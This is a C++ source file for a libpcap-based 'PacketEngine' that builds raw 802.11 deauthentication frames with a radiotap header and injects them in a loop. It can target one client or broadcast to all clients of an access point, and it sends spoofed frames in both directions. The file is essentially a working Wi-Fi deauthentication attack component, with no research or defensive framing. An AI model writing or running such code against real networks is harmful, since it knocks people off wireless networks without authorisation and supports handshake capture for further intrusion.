#include "PacketEngine.h"
#include "utils/Logger.h"
#include <cstring>
#include <chrono>
#include <thread>
#include <sstream>
#include <iomanip>

// Radiotap header (minimal)
static const uint8_t RADIOTAP_HDR[] = {
    0x00, 0x00,             // revision, pad
    0x08, 0x00,             // header length = 8
    0x00, 0x00, 0x00, 0x00  // present flags (none)
};

PacketEngine::PacketEngine(const std::string& iface) : m_iface(iface) {}

PacketEngine::~PacketEngine() { close(); }

bool PacketEngine::open() {
    m_handle = pcap_open_live(m_iface.c_str(), 65535, 1, 1000, m_errbuf);
    if (!m_handle) {
        LOG_ERROR("pcap_open_live failed: " + std::string(m_errbuf));
        return false;
    }
    if (pcap_datalink(m_handle) != DLT_IEEE802_11_RADIO) {
        LOG_WARN("Interface may not be in monitor mode");
    }
    LOG_INFO("PacketEngine opened on " + m_iface);
    return true;
}

void PacketEngine::close() {
    if (m_handle) { pcap_close(m_handle); m_handle = nullptr; }
}

bool PacketEngine::parseMac(const std::string& mac, uint8_t out[6]) {
    if (mac.size() < 17) return false;
    for (int i = 0; i < 6; i++) {
        out[i] = (uint8_t)std::stoul(mac.substr(i*3, 2), nullptr, 16);
    }
    return true;
}

std::vector<uint8_t> PacketEngine::buildDeauthFrame(
    const std::string& dst, const std::string& src,
    const std::string& bssid, uint16_t reason)
{
    uint8_t dstM[6], srcM[6], bssM[6];
    parseMac(dst,   dstM);
    parseMac(src,   srcM);
    parseMac(bssid, bssM);

    std::vector<uint8_t> pkt;
    // Radiotap
    for (auto b : RADIOTAP_HDR) pkt.push_back(b);

    // 802.11 Deauth frame header
    pkt.push_back(0xC0); // frame control byte 0: type=mgmt, subtype=deauth
    pkt.push_back(0x00); // frame control byte 1
    pkt.push_back(0x3A); // duration
    pkt.push_back(0x01);

    for (int i = 0; i < 6; i++) pkt.push_back(dstM[i]);  // DA
    for (int i = 0; i < 6; i++) pkt.push_back(srcM[i]);  // SA
    for (int i = 0; i < 6; i++) pkt.push_back(bssM[i]);  // BSSID

    pkt.push_back(0x00); pkt.push_back(0x00); // sequence

    // Reason code
    pkt.push_back(reason & 0xFF);
    pkt.push_back((reason >> 8) & 0xFF);

    return pkt;
}

bool PacketEngine::sendDeauth(const std::string& bssid, const std::string& client,
                              int count, int delayMs)
{
    if (!m_handle) return false;
    std::string broadcast = "FF:FF:FF:FF:FF:FF";
    std::string target    = client.empty() ? broadcast : client;

    LOG_INFO("Sending " + std::to_string(count) + " deauth to " + target + " from " + bssid);

    for (int i = 0; i < count; i++) {
        // AP -> client
        auto pkt1 = buildDeauthFrame(target, bssid, bssid);
        injectRaw(pkt1.data(), (int)pkt1.size());

        if (!client.empty()) {
            // client -> AP
            auto pkt2 = buildDeauthFrame(bssid, target, bssid);
            injectRaw(pkt2.data(), (int)pkt2.size());
        }

        if (delayMs > 0)
            std::this_thread::sleep_for(std::chrono::milliseconds(delayMs));
    }
    return true;
}

bool PacketEngine::injectRaw(const uint8_t* data, int len) {
    if (!m_handle) return false;
    return pcap_inject(m_handle, data, len) == len;
}

bool PacketEngine::sendPacket(const std::vector<uint8_t>& pkt) {
    return injectRaw(pkt.data(), (int)pkt.size());
}

void PacketEngine::capture(PacketCallback cb, int timeoutMs) {
    if (!m_handle) return;
    struct pcap_pkthdr* hdr;
    const uint8_t* data;
    auto start = std::chrono::steady_clock::now();
    while (true) {
        int ret = pcap_next_ex(m_handle, &hdr, &data);
        if (ret == 1 && cb) cb(data, hdr->len);
        auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(
            std::chrono::steady_clock::now() - start).count();
        if (elapsed >= timeoutMs) break;
    }
}
